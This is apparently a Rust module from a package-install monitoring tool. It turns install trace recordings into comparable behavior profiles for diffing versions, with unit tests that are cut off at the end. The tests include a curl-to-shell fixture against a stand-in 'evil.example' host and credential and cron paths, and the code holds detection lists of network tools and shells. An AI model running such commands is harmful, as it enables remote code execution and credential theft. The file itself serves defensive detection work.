//! Reducing a recording to the behaviors a version-diff can compare.
//!
//! The moat (Architecture.md:90) is `installscope diff <pkg> 1.2.3 1.2.4` answering "what changed
//! behaviorally". That requires comparing two recordings made at different times, on different
//! machines, in different directories — and almost nothing in a raw event stream survives that
//! comparison unchanged.
//!
//! # What cannot be compared, and why
//!
//! | Field | Why it differs between two runs of the *same* version |
//! |---|---|
//! | `ts_ns` | wall-clock timing; nothing is reproducible about it |
//! | `pid` | assigned by the kernel |
//! | absolute paths | `/home/runner/work/abc123/project` vs `/tmp/x/project` |
//! | byte counts | a tarball's decompressed size is stable, a log line's is not |
//! | resolver IP | whatever DNS the runner was configured with |
//!
//! Diffing any of those produces a report where every pair of recordings differs, which is the same as
//! having no diff at all. So a recording is reduced to [`Behavior`] values: zone-relative paths,
//! hostnames, executable names, and ports.
//!
//! # Why paths become zone-relative rather than being dropped
//!
//! `project/node_modules/.bin/thing` is comparable across runs; `/home/runner/work/x/project/...` is
//! not. The recording declares its own zones in `session_start`, so the prefix that varies is exactly
//! the prefix the recording tells us about. A path outside every zone keeps its absolute form — that is
//! the critical case (`Architecture.md` §4) and a rewritten `/etc/cron.d/evil` would be worse than
//! useless.
//!
//! # Why an unresolvable path is recorded as unresolvable
//!
//! The aya backend produces mostly-unresolved paths (`core/src/zones.rs` module docs). Dropping them
//! would make an aya recording look quieter than a strace one; guessing a zone for them would
//! manufacture the critical finding. They become [`Behavior::WroteUnresolved`], which compares honestly
//! against its counterpart and stays visibly distinct from a placed path.

use std::collections::BTreeSet;

use installscope_core::{Backend, Event, Payload, Placement, TracedPath, WriteKind, Zone, Zones};

/// One comparable behavior.
///
/// Ordered so a diff renders deterministically, and coarse on purpose: two recordings of the same
/// version must produce identical sets when the package did not change.
#[derive(Debug, Clone, PartialEq, Eq, PartialOrd, Ord)]
pub enum Behavior {
    /// A filesystem mutation inside a declared zone, with the path relative to that zone.
    Wrote {
        /// Which zone.
        zone: Zone,
        /// Path relative to the zone root, `/`-separated.
        relative: String,
        /// What kind of mutation.
        kind: WriteKind,
    },
    /// A filesystem mutation outside every declared zone, keeping its absolute path.
    ///
    /// The critical class. Never rewritten: the whole point is *where* it landed.
    WroteOutside {
        /// Absolute path as observed.
        path: String,
        /// What kind of mutation.
        kind: WriteKind,
    },
    /// A write to a kernel pseudo-path (`/proc`, `/dev`, …).
    ///
    /// Kept as its own class rather than discarded, because a version that starts writing to
    /// `/proc/sys/...` has changed behavior even though `zones.rs` correctly refuses to score it.
    WroteRuntime {
        /// The pseudo-path.
        path: String,
        /// What kind of mutation.
        kind: WriteKind,
    },
    /// A mutation whose path the backend could not resolve.
    ///
    /// Carries the raw string so two aya recordings can be compared with each other, and stays a
    /// distinct variant so an aya recording is never mistaken for a quieter one.
    WroteUnresolved {
        /// The path as the backend reported it, unresolved.
        raw: String,
        /// What kind of mutation.
        kind: WriteKind,
    },
    /// A read of a credential- or environment-bearing path.
    ReadCredential {
        /// Zone-relative when inside one, absolute otherwise.
        path: String,
    },
    /// A hostname resolved during the install.
    Resolved {
        /// The queried name, lowercased.
        qname: String,
    },
    /// An outbound connection, by port.
    ///
    /// Deliberately *not* by IP: a registry's address changes between runs and between regions, so an
    /// IP-keyed behavior would differ on every recording. The port survives, and the hostname is
    /// carried by [`Self::Resolved`].
    Connected {
        /// Destination port.
        port: u16,
        /// Whether the destination was loopback.
        loopback: bool,
        /// Whether the destination was RFC1918 / link-local.
        private: bool,
    },
    /// A connection to a Unix domain socket.
    ConnectedUnix {
        /// Socket path.
        path: String,
    },
    /// A process execution, by executable name.
    ///
    /// The *basename*, because `/usr/bin/node` and `/opt/hostedtoolcache/node/20/bin/node` are the same
    /// program and a full path would differ between a runner and a laptop.
    Spawned {
        /// Executable basename.
        program: String,
    },
    /// A spawned command line that pipes a download into a shell.
    ///
    /// Extracted as its own behavior because it is the shape that matters most and it is invisible in a
    /// bare `Spawned { program: "sh" }`.
    SpawnedShellPipeline {
        /// Which network tool appeared in the pipeline.
        tool: String,
    },
}

impl Behavior {
    /// A short label for a diff line.
    #[must_use]
    pub fn summary(&self) -> String {
        match self {
            Self::Wrote {
                zone,
                relative,
                kind,
            } => format!("{} {zone}/{relative}", verb(*kind)),
            Self::WroteOutside { path, kind } => {
                format!("{} {path} (outside expected directories)", verb(*kind))
            }
            Self::WroteRuntime { path, kind } => format!("{} {path}", verb(*kind)),
            Self::WroteUnresolved { raw, kind } => {
                format!("{} {raw} (path unresolved by the recorder)", verb(*kind))
            }
            Self::ReadCredential { path } => format!("read {path}"),
            Self::Resolved { qname } => format!("resolved {qname}"),
            Self::Connected {
                port,
                loopback,
                private,
            } => {
                let scope = if *loopback {
                    " (loopback)"
                } else if *private {
                    " (private network)"
                } else {
                    ""
                };
                format!("connected to port {port}{scope}")
            }
            Self::ConnectedUnix { path } => format!("connected to unix socket {path}"),
            Self::Spawned { program } => format!("ran {program}"),
            Self::SpawnedShellPipeline { tool } => {
                format!("piped {tool} output into a shell")
            }
        }
    }

    /// A coarse class, for grouping a diff by kind of behavior.
    #[must_use]
    pub const fn class(&self) -> BehaviorClass {
        match self {
            Self::Wrote { .. } | Self::WroteRuntime { .. } | Self::WroteUnresolved { .. } => {
                BehaviorClass::Filesystem
            }
            Self::WroteOutside { .. } => BehaviorClass::FilesystemEscape,
            Self::ReadCredential { .. } => BehaviorClass::CredentialRead,
            Self::Resolved { .. } | Self::Connected { .. } | Self::ConnectedUnix { .. } => {
                BehaviorClass::Network
            }
            Self::Spawned { .. } | Self::SpawnedShellPipeline { .. } => BehaviorClass::Process,
        }
    }

    /// True when this behavior appearing where it previously did not is worth a reader's attention.
    ///
    /// Not a severity — the rules engine owns severity and this crate must not grow a second, quieter
    /// copy of it. This is only about which lines a three-bullet summary should reach for first.
    #[must_use]
    pub const fn is_notable(&self) -> bool {
        matches!(
            self.class(),
            BehaviorClass::FilesystemEscape
                | BehaviorClass::CredentialRead
                | BehaviorClass::Network
                | BehaviorClass::Process
        )
    }
}

/// Coarse behavior classes, for grouping.
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord)]
pub enum BehaviorClass {
    /// Writes inside expected directories, runtime paths, unresolved paths.
    Filesystem,
    /// Writes provably outside every declared zone.
    FilesystemEscape,
    /// Reads of credential-bearing paths.
    CredentialRead,
    /// DNS and connections.
    Network,
    /// Process execution.
    Process,
}

impl BehaviorClass {
    /// Every class, for a stable table order.
    pub const ALL: &'static [Self] = &[
        Self::FilesystemEscape,
        Self::CredentialRead,
        Self::Network,
        Self::Process,
        Self::Filesystem,
    ];

    /// Name for reports.
    #[must_use]
    pub const fn as_str(self) -> &'static str {
        match self {
            Self::Filesystem => "filesystem",
            Self::FilesystemEscape => "writes outside expected directories",
            Self::CredentialRead => "credential reads",
            Self::Network => "network",
            Self::Process => "processes",
        }
    }
}

impl std::fmt::Display for BehaviorClass {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        f.write_str(self.as_str())
    }
}

/// Past-tense verb for a mutation kind.
const fn verb(kind: WriteKind) -> &'static str {
    match kind {
        WriteKind::Open | WriteKind::Write | WriteKind::Create => "wrote",
        WriteKind::Truncate => "truncated",
        WriteKind::Mkdir => "created directory",
        WriteKind::Rename => "renamed to",
        WriteKind::Delete => "deleted",
        WriteKind::Symlink => "symlinked",
        WriteKind::Hardlink => "hardlinked",
        WriteKind::Chmod => "changed permissions on",
        WriteKind::Chown => "changed owner of",
    }
}

/// What a recording did, reduced to comparable facts.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Profile {
    /// Which recorder produced the stream.
    ///
    /// Carried because two profiles from different backends are not comparable on equal terms — the aya
    /// backend records no credential reads and no DNS at all (`Memory.md` locked decision). The diff
    /// engine must say so rather than reporting the asymmetry as a behavioral change.
    pub backend: Backend,
    /// Whether the recording was complete.
    ///
    /// A profile of a PARTIAL recording exists, because refusing to build one would leave a caller
    /// unable to inspect what it did capture. What the *diff* does with it is a separate decision, made
    /// in `diff.rs`.
    pub complete: bool,
    /// Every distinct behavior, deduplicated and ordered.
    pub behaviors: BTreeSet<Behavior>,
    /// Paths the recorder could not resolve.
    ///
    /// Counted separately from the behaviors so a diff can report "this recording had 400 unplaceable
    /// paths" rather than presenting them as if they were located.
    pub unresolved_paths: u32,
}

impl Profile {
    /// Behaviors in one class.
    #[must_use]
    pub fn in_class(&self, class: BehaviorClass) -> Vec<&Behavior> {
        self.behaviors
            .iter()
            .filter(|behavior| behavior.class() == class)
            .collect()
    }

    /// Number of distinct behaviors.
    #[must_use]
    pub fn len(&self) -> usize {
        self.behaviors.len()
    }

    /// True when nothing comparable was observed.
    #[must_use]
    pub fn is_empty(&self) -> bool {
        self.behaviors.is_empty()
    }
}

/// Network tools whose output piped into a shell is the shape worth extracting.
///
/// Kept short and here rather than read from the rule catalog: this module is about *comparability*
/// between two recordings, not about scoring, and coupling it to a user-editable catalog would mean an
/// edit to that file silently changed what two historical snapshots compare as.
const NETWORK_TOOLS: &[&str] = &["curl", "wget", "fetch", "aria2c"];

/// Shell interpreters that make a pipeline dangerous.
const SHELLS: &[&str] = &[
    "sh", "bash", "zsh", "dash", "ksh", "python", "python3", "node", "perl", "ruby",
];

/// Reduces an event stream to a comparable profile.
///
/// Zones come from the stream's own `session_start`, so a recording made in `/tmp/x` and one made in
/// `/home/runner/work/y` reduce to the same relative paths.
#[must_use]
pub fn profile_of(events: &[Event]) -> Profile {
    let zones = events
        .iter()
        .find_map(|event| match &event.payload {
            Payload::SessionStart(start) => Some(start.zones.clone()),
            _ => None,
        })
        .unwrap_or_default();

    let complete = events
        .iter()
        .rev()
        .find_map(|event| match &event.payload {
            Payload::SessionEnd(end) => Some(end.complete),
            _ => None,
        })
        .unwrap_or(false);

    let backend = events
        .first()
        .map_or(Backend::Strace, |event| event.meta.backend);

    let mut behaviors = BTreeSet::new();
    let mut unresolved_paths: u32 = 0;

    for event in events {
        match &event.payload {
            Payload::FsWrite(write) => {
                // A failed syscall is intent, not effect. A version whose install *tried* to write
                // somewhere and got EACCES has not changed what it did to the filesystem, and a diff
                // that reported the attempt would flag every recording made under a different umask.
                if write.outcome.failed_known() {
                    continue;
                }
                let placed = place(&write.target, &zones);
                if matches!(placed, Placed::Unresolvable(_)) {
                    unresolved_paths = unresolved_paths.saturating_add(1);
                }
                behaviors.insert(write_behavior(placed, write.kind));
            }
            Payload::FsRead(read) => {
                // A *failed* credential read is kept, unlike a failed write: reading `~/.ssh/id_rsa`
                // and getting ENOENT still says the install went looking, and that is the behavior a
                // version-to-version diff should surface.
                let placed = place(&read.target, &zones);
                if matches!(placed, Placed::Unresolvable(_)) {
                    unresolved_paths = unresolved_paths.saturating_add(1);
                }
                behaviors.insert(Behavior::ReadCredential {
                    path: placed.into_display_path(),
                });
            }
            Payload::NetConnect(connect) => {
                if let Some(behavior) = connect_behavior(connect) {
                    behaviors.insert(behavior);
                }
            }
            Payload::DnsQuery(query) => {
                behaviors.insert(Behavior::Resolved {
                    // Lowercased because DNS is case-insensitive and a resolver may echo mixed case.
                    // Two recordings differing only in case would otherwise read as a changed host.
                    qname: query.qname.to_ascii_lowercase(),
                });
            }
            Payload::ProcSpawn(spawn) => {
                if let Some(program) = spawn
                    .bin
                    .as_deref()
                    .map(basename)
                    .filter(|program| !program.is_empty())
                {
                    behaviors.insert(Behavior::Spawned {
                        program: program.to_string(),
                    });
                }
                if let Some(tool) = shell_pipeline_tool(&spawn.argv) {
                    behaviors.insert(Behavior::SpawnedShellPipeline { tool });
                }
            }
            Payload::SessionStart(_) | Payload::SessionEnd(_) | Payload::Heartbeat(_) => {}
        }
    }

    Profile {
        backend,
        complete,
        behaviors,
        unresolved_paths,
    }
}

/// Turns a placed write into its behavior.
fn write_behavior(placed: Placed, kind: WriteKind) -> Behavior {
    match placed {
        Placed::Inside { zone, relative } => Behavior::Wrote {
            zone,
            relative,
            kind,
        },
        Placed::Outside(path) => Behavior::WroteOutside { path, kind },
        Placed::Runtime(path) => Behavior::WroteRuntime { path, kind },
        Placed::Unresolvable(raw) => Behavior::WroteUnresolved { raw, kind },
    }
}

/// Turns a connect into its behavior, or `None` when it is not a destination.
fn connect_behavior(connect: &installscope_core::NetConnect) -> Option<Behavior> {
    if let Some(unix_path) = &connect.unix_path {
        return Some(Behavior::ConnectedUnix {
            path: unix_path.clone(),
        });
    }
    // Port 0 is glibc probing candidate addresses (Memory.md, Phase 1 limitations). It is not a
    // destination, and including it would add a behavior to every recording that resolved a name.
    connect
        .port
        .filter(|port| *port != 0)
        .map(|port| Behavior::Connected {
            port,
            loopback: connect.loopback,
            private: connect.private,
        })
}

/// Where a path sits, with the zone prefix already removed.
enum Placed {
    Inside { zone: Zone, relative: String },
    Outside(String),
    Runtime(String),
    Unresolvable(String),
}

impl Placed {
    /// A single comparable path string, for the classes that do not keep the zone separately.
    fn into_display_path(self) -> String {
        match self {
            Self::Inside { zone, relative } => format!("{zone}/{relative}"),
            Self::Outside(path) | Self::Runtime(path) | Self::Unresolvable(path) => path,
        }
    }
}

/// Places a path and makes it comparable.
fn place(path: &TracedPath, zones: &Zones) -> Placed {
    match installscope_core::placement_of(path, zones) {
        Placement::Inside(zone) => {
            let prefix = zone_prefix(zone, zones).unwrap_or_default();
            Placed::Inside {
                zone,
                relative: relative_to(&path.path, &prefix),
            }
        }
        Placement::Outside => Placed::Outside(path.path.clone()),
        Placement::Runtime => Placed::Runtime(path.path.clone()),
        Placement::Unresolvable => Placed::Unresolvable(path.path.clone()),
    }
}

/// The declared prefix for a zone.
///
/// [`Zone::Declared`] covers several prefixes at once, so the matching one is found by testing them —
/// the same component-boundary test `zones.rs` uses, kept consistent by delegating to `placement_of`
/// rather than reimplementing the comparison.
fn zone_prefix(zone: Zone, zones: &Zones) -> Option<String> {
    match zone {
        Zone::Project => zones.project.clone(),
        Zone::Cache => zones.cache.clone(),
        Zone::Home => zones.home.clone(),
        Zone::Tmp => zones.tmp.clone(),
        Zone::Declared => None,
    }
}

/// Strips a zone prefix, leaving a `/`-relative remainder.
///
/// When the prefix does not match — the [`Zone::Declared`] case, where several prefixes are possible —
/// the longest declared prefix is not searched for here; the full path is kept instead. That is the
/// conservative direction: an over-long relative path compares equal to itself across runs as long as
/// the extra prefix is stable, whereas a wrongly-stripped one could collide with a different file.
fn relative_to(path: &str, prefix: &str) -> String {
    let trimmed = prefix.trim_end_matches('/');
    if trimmed.is_empty() {
        return path.trim_start_matches('/').to_string();
    }
    match path.strip_prefix(trimmed) {
        Some(rest) => {
            let rest = rest.trim_start_matches('/');
            if rest.is_empty() {
                ".".to_string()
            } else {
                rest.to_string()
            }
        }
        None => path.trim_start_matches('/').to_string(),
    }
}

/// Final path component.
fn basename(path: &str) -> &str {
    path.rsplit('/').next().unwrap_or(path)
}

/// Detects a download piped into an interpreter, returning the tool.
///
/// Requires *both* a network tool and a shell on the same command line, with a pipe between them. A
/// command that merely mentions `curl` is not a pipeline, and reporting it as one would put a
/// fabricated behavior into a permanent snapshot.
fn shell_pipeline_tool(argv: &[String]) -> Option<String> {
    let joined = argv.join(" ");
    if !joined.contains('|') {
        return None;
    }
    let (upstream, downstream) = joined.split_once('|')?;
    let tool = NETWORK_TOOLS
        .iter()
        .find(|tool| contains_word(upstream, tool))?;
    // The interpreter has to be downstream of the pipe. `sh -c "curl x | tee y"` pipes into tee, and
    // calling that a shell pipeline would be wrong.
    SHELLS
        .iter()
        .any(|shell| contains_word(downstream, shell))
        .then(|| (*tool).to_string())
}

/// Whether `needle` appears in `text` at a word boundary.
///
/// Prevents `securl` from matching `curl`, which would attribute a download to a command that never
/// made one.
fn contains_word(text: &str, needle: &str) -> bool {
    text.split(|c: char| !c.is_ascii_alphanumeric() && c != '_' && c != '-')
        .any(|word| word == needle)
}

#[cfg(test)]
mod tests {
    use super::*;
    use installscope_core::{
        AddrFamily, DnsQuery, EventMeta, FsRead, FsWrite, NetConnect, Outcome, PathOrigin,
        ProcSpawn, SessionEnd, SessionStart,
    };

    fn zones(root: &str) -> Zones {
        Zones {
            project: Some(format!("{root}/project")),
            cache: Some(format!("{root}/cache")),
            home: Some(format!("{root}/home")),
            tmp: Some(format!("{root}/tmp")),
            extra: Vec::new(),
        }
    }

    /// Builds a stream in a given root, so the same logical recording can be produced "twice on
    /// different machines" — which is the whole property this module exists to provide.
    fn stream(root: &str, backend: Backend, payloads: Vec<Payload>) -> Vec<Event> {
        let mut events = vec![Event::framing(
            0,
            backend,
            Payload::SessionStart(SessionStart {
                wall_clock_utc: "2026-09-01T12:00:00Z".to_string(),
                agent_version: "0.1.0".to_string(),
                command: vec!["npm".to_string(), "install".to_string()],
                zones: zones(root),
                host: None,
            }),
        )];
        for (index, payload) in payloads.into_iter().enumerate() {
            let ts = index as u64 + 1;
            let pid = u32::try_from(index).unwrap_or(0) + 1000;
            events.push(Event::observed(
                EventMeta::observed(ts, pid, "openat", backend),
                payload,
            ));
        }
        events.push(Event::framing(
            9_999,
            backend,
            Payload::SessionEnd(SessionEnd::complete(Some(0), 9_999, 1, 1)),
        ));
        events
    }

    fn write(path: &str, origin: PathOrigin, kind: WriteKind) -> Payload {
        Payload::FsWrite(FsWrite {
            target: TracedPath::new(path, origin),
            kind,
            bytes: Some(4096),
            flags: None,
            mode: None,
            source: None,
            outcome: Outcome::success(),
        })
    }

    fn spawn(bin: &str, argv: &[&str]) -> Payload {
        Payload::ProcSpawn(ProcSpawn {
            bin: Some(bin.to_string()),
            argv: argv.iter().map(ToString::to_string).collect(),
            argv_truncated: false,
            outcome: Outcome::success(),
        })
    }

    #[test]
    fn two_recordings_in_different_directories_reduce_to_the_same_profile() {
        // THE property. Without it, every pair of recordings differs and the version-diff moat is
        // worthless. Two roots that share no path components at all.
        let payloads = |root: &str| {
            vec![
                write(
                    &format!("{root}/project/node_modules/.bin/thing"),
                    PathOrigin::Kernel,
                    WriteKind::Open,
                ),
                write(
                    &format!("{root}/cache/_cacache/index-v5/aa/bb"),
                    PathOrigin::Kernel,
                    WriteKind::Write,
                ),
                spawn("/usr/bin/node", &["node", "install.js"]),
            ]
        };

        let runner = profile_of(&stream(
            "/home/runner/work/repo-abc123",
            Backend::Strace,
            payloads("/home/runner/work/repo-abc123"),
        ));
        let laptop = profile_of(&stream(
            "/tmp/scratch",
            Backend::Strace,
            payloads("/tmp/scratch"),
        ));

        assert_eq!(
            runner.behaviors, laptop.behaviors,
            "the same install in two directories must reduce identically"
        );
        assert!(runner.behaviors.contains(&Behavior::Wrote {
            zone: Zone::Project,
            relative: "node_modules/.bin/thing".to_string(),
            kind: WriteKind::Open,
        }));
    }

    #[test]
    fn a_path_outside_every_zone_keeps_its_absolute_form() {
        // The critical class (Architecture.md §4). A rewritten /etc/cron.d/evil would be worse than
        // useless: the location is the finding.
        let profile = profile_of(&stream(
            "/work",
            Backend::Strace,
            vec![write(
                "/etc/cron.d/evil",
                PathOrigin::Kernel,
                WriteKind::Open,
            )],
        ));
        assert!(profile.behaviors.contains(&Behavior::WroteOutside {
            path: "/etc/cron.d/evil".to_string(),
            kind: WriteKind::Open,
        }));
        assert_eq!(profile.in_class(BehaviorClass::FilesystemEscape).len(), 1);
    }

    #[test]
    fn an_unresolved_path_is_neither_placed_nor_dropped() {
        // The aya backend produces mostly-unresolved paths. Dropping them would make an aya recording
        // look quieter; guessing a zone would manufacture the critical finding.
        let profile = profile_of(&stream(
            "/work",
            Backend::Aya,
            vec![write(
                "node_modules/.bin/thing",
                PathOrigin::Unresolved,
                WriteKind::Open,
            )],
        ));
        assert_eq!(profile.unresolved_paths, 1);
        assert!(profile.behaviors.contains(&Behavior::WroteUnresolved {
            raw: "node_modules/.bin/thing".to_string(),
            kind: WriteKind::Open,
        }));
        assert!(
            profile.in_class(BehaviorClass::FilesystemEscape).is_empty(),
            "an unresolved path must never become an escape"
        );
    }

    #[test]
    fn a_runtime_path_is_kept_as_its_own_class() {
        // zones.rs correctly refuses to score these, but a version that starts writing to /proc has
        // changed behavior and a diff should say so.
        let profile = profile_of(&stream(
            "/work",
            Backend::Strace,
            vec![write(
                "/proc/self/oom_score_adj",
                PathOrigin::Kernel,
                WriteKind::Open,
            )],
        ));
        assert!(profile.behaviors.contains(&Behavior::WroteRuntime {
            path: "/proc/self/oom_score_adj".to_string(),
            kind: WriteKind::Open,
        }));
        assert!(profile.in_class(BehaviorClass::FilesystemEscape).is_empty());
    }

    #[test]
    fn a_failed_write_is_not_a_behavior() {
        // Intent, not effect. Including it would flag every recording made under a different umask.
        let mut failed = write("/etc/passwd", PathOrigin::Kernel, WriteKind::Open);
        if let Payload::FsWrite(inner) = &mut failed {
            inner.outcome = Outcome::failed("EACCES");
        }
        let profile = profile_of(&stream("/work", Backend::Strace, vec![failed]));
        assert!(profile.is_empty(), "{:?}", profile.behaviors);
    }

    #[test]
    fn a_failed_credential_read_is_kept() {
        // Unlike a write: looking for ~/.ssh/id_rsa and getting ENOENT still says the install went
        // looking, which is exactly what a version-to-version diff should surface.
        let profile = profile_of(&stream(
            "/work",
            Backend::Strace,
            vec![Payload::FsRead(FsRead {
                target: TracedPath::new("/work/home/.ssh/id_rsa", PathOrigin::Kernel),
                bytes: None,
                outcome: Outcome::failed("ENOENT"),
            })],
        ));
        assert!(profile.behaviors.contains(&Behavior::ReadCredential {
            path: "home/.ssh/id_rsa".to_string(),
        }));
        assert_eq!(profile.in_class(BehaviorClass::CredentialRead).len(), 1);
    }

    #[test]
    fn connections_are_keyed_by_port_not_by_address() {
        // A registry's IP differs between runs and between regions. Keying on it would make every
        // recording differ from every other.
        let connect = |ip: &str| {
            Payload::NetConnect(NetConnect {
                family: AddrFamily::Inet,
                ip: Some(ip.to_string()),
                port: Some(443),
                unix_path: None,
                host: None,
                loopback: false,
                private: false,
                outcome: Outcome::success(),
            })
        };
        let first = profile_of(&stream(
            "/work",
            Backend::Strace,
            vec![connect("104.16.2.34")],
        ));
        let second = profile_of(&stream(
            "/work",
            Backend::Strace,
            vec![connect("104.16.7.99")],
        ));
        assert_eq!(
            first.behaviors, second.behaviors,
            "the same port on a different address is the same behavior"
        );
    }

    #[test]
    fn port_zero_is_not_a_destination() {
        // glibc probes candidate addresses with port 0 (Memory.md, Phase 1 limitations). Including it
        // would add a behavior to every recording that resolved a name.
        let profile = profile_of(&stream(
            "/work",
            Backend::Strace,
            vec![Payload::NetConnect(NetConnect {
                family: AddrFamily::Inet,
                ip: Some("1.2.3.4".to_string()),
                port: Some(0),
                unix_path: None,
                host: None,
                loopback: false,
                private: false,
                outcome: Outcome::success(),
            })],
        ));
        assert!(profile.is_empty(), "{:?}", profile.behaviors);
    }

    #[test]
    fn a_hostname_is_lowercased() {
        // DNS is case-insensitive and a resolver may echo mixed case. Two recordings differing only in
        // case would otherwise read as a changed host.
        let query = |name: &str| {
            Payload::DnsQuery(DnsQuery {
                qname: name.to_string(),
                qtype: Some(1),
                resolver_ip: Some("127.0.0.53".to_string()),
                outcome: Outcome::success(),
            })
        };
        let upper = profile_of(&stream(
            "/work",
            Backend::Strace,
            vec![query("Registry.NPMJS.org")],
        ));
        let lower = profile_of(&stream(
            "/work",
            Backend::Strace,
            vec![query("registry.npmjs.org")],
        ));
        assert_eq!(upper.behaviors, lower.behaviors);
    }

    #[test]
    fn a_spawn_is_keyed_by_basename() {
        // /usr/bin/node and /opt/hostedtoolcache/node/20/bin/node are the same program; a full path
        // would differ between a runner and a laptop.
        let runner = profile_of(&stream(
            "/work",
            Backend::Strace,
            vec![spawn(
                "/opt/hostedtoolcache/node/20.11.0/x64/bin/node",
                &["node", "x.js"],
            )],
        ));
        let laptop = profile_of(&stream(
            "/work",
            Backend::Strace,
            vec![spawn("/usr/local/bin/node", &["node", "x.js"])],
        ));
        assert_eq!(runner.behaviors, laptop.behaviors);
        assert!(runner.behaviors.contains(&Behavior::Spawned {
            program: "node".to_string()
        }));
    }

    #[test]
    fn a_download_piped_into_a_shell_is_extracted() {
        // Invisible in a bare Spawned { program: "sh" }, and it is the shape that matters most.
        let profile = profile_of(&stream(
            "/work",
            Backend::Strace,
            vec![spawn(
                "/bin/sh",
                &["sh", "-c", "curl -sL https://evil.example/x.sh | sh"],
            )],
        ));
        assert!(
            profile.behaviors.contains(&Behavior::SpawnedShellPipeline {
                tool: "curl".to_string()
            }),
            "{:?}",
            profile.behaviors
        );
    }

    #[test]
    fn a_pipeline_into_something_that_is_not_a_shell_is_not_flagged() {
        // `curl x | tee y` is not a shell pipeline. Calling it one would put a fabricated behavior into
        // a permanent snapshot.
        assert_eq!(
            shell_pipeline_tool(&[
                "sh".to_string(),
                "-c".to_string(),
                "curl -sL https://example.invalid/x | tee out.txt".to_string(),
            ]),
            None
        );
        // And a mention with no pipe at all is not a pipeline either.
        assert_eq!(
            shell_pipeline_tool(&[
                "sh".to_string(),
                "-c".to_string(),
                "curl -o x https://y".to_string()
            ]),
            None
        );
        // The interpreter must be downstream: `cat x | sh` has a shell but no network tool.
        assert_eq!(
            shell_pipeline_tool(&[
                "sh".to_string(),
                "-c".to_string(),
                "cat script | sh".to_string()
            ]),
            None
        );
    }

    #[test]
    fn word_boundaries_prevent_a_false_pipeline_match() {
        assert!(!contains_word("securl -x", "curl"));
        assert!(contains_word("curl -sL x", "curl"));
        assert!(contains_word("/usr/bin/curl", "curl"));
        assert_eq!(
            shell_pipeline_tool(&[
                "sh".to_string(),
                "-c".to_string(),
                "securl x | shell".to_string()
            ]),
            None,
            "neither the tool nor the shell matches at a word boundary"
        );
    }

    #[test]
    fn duplicate_behaviors_collapse() {
        // A postinstall that writes the same file a thousand times exhibits one behavior. Counting
        // occurrences would make the profile depend on how busy a loop was.
        let profile = profile_of(&stream(
            "/work",
            Backend::Strace,
            vec![
                write("/work/project/a.js", PathOrigin::Kernel, WriteKind::Write),
                write("/work/project/a.js", PathOrigin::Kernel, WriteKind::Write),
                write("/work/project/a.js", PathOrigin::Kernel, WriteKind::Write),
            ],
        ));
        assert_eq!(profile.len(), 1);
    }

    #[test]
    fn a_write_to_a_zone_root_itself_is_representable() {
        // `mkdir /work/project` reduces to the zone root, which must not produce an empty relative path
        // that compares equal to every other zone root write.
        let profile = profile_of(&stream(
            "/work",
            Backend::Strace,
            vec![write("/work/project", PathOrigin::Kernel, WriteKind::Mkdir)],
        ));
        assert!(profile.behaviors.contains(&Behavior::Wrote {
            zone: Zone::Project,
            relative: ".".to_string(),
            kind: WriteKind::Mkdir,
        }));
    }

    #[test]
    fn a_stream_with_no_session_end_is_incomplete() {
        // What the diff does with it is diff.rs's decision; the profile must report it honestly.
        let mut events = stream("/work", Backend::Strace, vec![]);
        events.pop();
        assert!(!profile_of(&events).complete);
        assert!(profile_of(&stream("/work", Backend::Strace, vec![])).complete);
    }

    #[test]
    fn the_backend_is_carried_on_the_profile() {
        // Two profiles from different backends are not comparable on equal terms, and the diff engine
        // needs to know before it reports anything.
        assert_eq!(
            profile_of(&stream("/work", Backend::Aya, vec![])).backend,
            Backend::Aya
        );
        assert_eq!(
            profile_of(&stream("/work", Backend::Strace, vec![])).backend,
            Backend::Strace
        );
    }

    #[test]
    fn profiling_is_deterministic() {
        let events = stream(
            "/work",
            Backend::Strace,
            vec![
                write("/work/project/b.js", PathOrigin::Kernel, WriteKind::Open),
                write("/work/project/a.js", PathOrigin::Kernel, WriteKind::Open),
                spawn("/bin/sh", &["sh", "-c", "true"]),
            ],
        );
        assert_eq!(profile_of(&events), profile_of(&events));
        // And the ordering is by value, so a diff renders the same way every time.
        let first: Vec<String> = profile_of(&events)
            .behaviors
            .iter()
            .map(Behavior::summary)
            .collect();
        let second: Vec<String> = profile_of(&events)
            .behaviors
            .iter()
            .map(Behavior::summary)
            .collect();
        assert_eq!(first, second);
    }

    #[test]
    fn a_stream_with_no_session_start_places_nothing_inside_a_zone() {
        // Honest but useless, and worth pinning: with no declared zones, every resolved path is Outside.
        // The alternative — inventing zones — would hide a real escape.
        let events = vec![Event::observed(
            EventMeta::observed(1, 1, "openat", Backend::Strace),
            write("/work/project/a.js", PathOrigin::Kernel, WriteKind::Open),
        )];
        let profile = profile_of(&events);
        assert!(matches!(
            profile.behaviors.iter().next(),
            Some(Behavior::WroteOutside { .. })
        ));
    }

    #[test]
    fn every_class_has_a_name_and_the_order_is_stable() {
        // Reports iterate this; a varying order would produce spurious diffs between two renderings of
        // the same comparison.
        assert_eq!(BehaviorClass::ALL.len(), 5);
        assert_eq!(
            BehaviorClass::ALL.first(),
            Some(&BehaviorClass::FilesystemEscape),
            "the escape class leads, because it is the one that matters most"
        );
        for class in BehaviorClass::ALL {
            assert!(!class.as_str().is_empty());
        }
    }

    #[test]
    fn summaries_use_no_banned_framing() {
        // Rules.md §4. A summary line is the most quoted text in a diff report.
        let samples = vec![
            Behavior::Wrote {
                zone: Zone::Project,
                relative: "a.js".to_string(),
                kind: WriteKind::Open,
            },
            Behavior::WroteOutside {
                path: "/etc/x".to_string(),
                kind: WriteKind::Open,
            },
            Behavior::WroteRuntime {
                path: "/proc/x".to_string(),
                kind: WriteKind::Open,
            },
            Behavior::WroteUnresolved {
                raw: "x".to_string(),
                kind: WriteKind::Open,
            },
            Behavior::ReadCredential {
                path: "home/.ssh/id_rsa".to_string(),
            },
            Behavior::Resolved {
                qname: "example.invalid".to_string(),
            },
            Behavior::Connected {
                port: 443,
                loopback: false,
                private: false,
            },
            Behavior::ConnectedUnix {
                path: "/var/run/x".to_string(),
            },
            Behavior::Spawned {
                program: "node".to_string(),
            },
            Behavior::SpawnedShellPipeline {
                tool: "curl".to_string(),
            },
        ];
        for behavior in samples {
            let summary = behavior.summary().to_ascii_lowercase();
            for banned in ["safe", "protect", "guarantee", "sandbox", "secure"] {
                assert!(
                    !summary.contains(banned),
